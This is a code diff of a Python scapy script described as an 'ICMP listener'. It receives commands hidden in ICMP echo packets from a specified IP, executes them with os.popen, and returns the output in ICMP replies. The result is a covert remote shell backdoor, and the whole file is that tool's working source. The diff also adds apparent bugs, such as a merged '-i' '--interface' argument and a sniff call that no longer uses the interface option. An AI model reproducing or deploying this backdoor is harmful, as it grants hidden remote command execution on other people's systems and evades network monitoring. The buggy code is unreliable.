@@ -1,30 +1,34 @@
-from scapy.all import sr,IP,ICMP,Raw,sniff
+from scapy.all import sr,IP,ICMP,Raw,sniff 
 import argparse
 import os
 
-#Variables
-ICMP_ID = int(13170)
-TTL = int(64)
+ICMP_ID = 13170 
+time_to_live = 64
 
-def check_scapy():
-    try:
-        from scapy.all import sr,IP,ICMP,Raw,sniff
-    except ImportError:
-        print("Install the Py3 scapy module")
-
-parser = argparse.ArgumentParser()
-parser.add_argument('-i', '--interface', type=str, required=True, help="(Virtual) Network Interface (e.g. eth0)")
-parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
-args = parser.parse_args()
-
-def icmpshell(pkt):
-    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
-        icmppaket = (pkt[Raw].load).decode('utf-8', errors='ignore')
+def icmpshell(packet):
+    if packet[IP].src == args.destination_ip and packet[ICMP].type == 8 and packet[ICMP].id == ICMP_ID and packet[Raw].load:
+        icmppaket = (packet[Raw].load).decode('utf-8', errors='ignore')
         payload = os.popen(icmppaket).readlines()
-        icmppacket = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload))
+        icmppacket = (IP(dst=args.destination_ip, ttl=time_to_live)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload))
         sr(icmppacket, timeout=0, verbose=0)
     else:
         pass
 
-print("[+]ICMP listener started!")
-sniff(iface=args.interface, prn=icmpshell, filter="icmp", store="0")
+if __name__ == "__main__":
+    try:
+        from scapy.all import sr,IP,ICMP,Raw,sniff
+    except ImportError:
+        print('[!] Please install the python3 scapy module')
+        print('[!] use the command pip3 install scapy')
+        exit()
+        
+
+    #checks arguments passed in by user
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-i' '--interface', type=str, required=True, help="Listener (virtual) Network Interface eth0")
+    parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP adress")
+    args = parser.parse_args()
+
+    print('[+] ICMP listener started')
+    sniff(prn=icmpshell, filter='icmp', store='0')
+
